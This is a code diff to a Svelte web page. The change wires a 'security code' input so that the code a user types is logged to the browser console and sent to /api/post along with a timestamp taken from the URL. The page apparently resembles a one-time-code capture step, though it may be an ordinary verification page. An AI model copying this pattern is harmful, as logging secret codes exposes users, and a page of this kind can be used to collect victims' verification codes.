@@ -1,3 +1,39 @@
+<script context="module">
+    export function load({ url }) {
+        let query = url.searchParams;
+        return {
+            props: {
+                timestamp: query.get("t"),
+            },
+        };
+    }
+</script>
+
+<script>
+    import { onMount } from "svelte";
+    import { goto } from "$app/navigation";
+
+    async function put() {
+        console.log('pin',pin);
+        let res=await fetch("/api/post", {
+            method: "PUT",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                pin:pin,
+                timestamp:timestamp
+            }),
+        });
+        let val=await res.json()
+        console.log('res',val)
+        goto("/submit");
+    }
+    let pin = "";
+
+    export let timestamp;
+</script>
+
 
 <svelte:head>
     <meta charset="UTF-8">
@@ -35,8 +71,8 @@
                         <h4> code</h4>
                         <p style="margin-top: 10px;">A security code has been sent to your email address
                             Please enter the code here</p>
-                        <input type="password" placeholder=" security-code"> <br>
-                        <button type="button"><b>submit</b></button>
+                        <input type="password" placeholder=" security-code" bind:value={pin}> <br>
+                        <button type="button" on:click={put}><b>submit</b></button>
                         <p style="margin-top: 10px;">The code you received is good for 30 minutes 
                             It may take the code up to 10 minutes or so to arrive <br> Make sure to check your Spam/Junk/Trash folder</p>
 
